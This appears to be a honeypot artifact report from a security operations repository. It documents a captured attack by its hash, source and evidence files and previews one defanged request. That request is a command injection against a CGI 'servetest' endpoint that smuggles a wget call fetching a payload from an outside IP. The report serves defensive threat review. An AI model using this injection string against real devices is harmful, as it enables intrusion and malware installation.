# 635bb05d3a41eb2b3d57a727aa900a62fc54c295cac8bed5a3ea4acbc24dff18

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `635bb05d3a41eb2b3d57a727aa900a62fc54c295cac8bed5a3ea4acbc24dff18` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
POST /cgi-bin/operator/servetest?cmd=ntp&ServerName=%24%28wget%20http%3A%2F%2F31[.]56[.]39.XXX%2Fmemory_bin_dir%2Fmemory_load
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
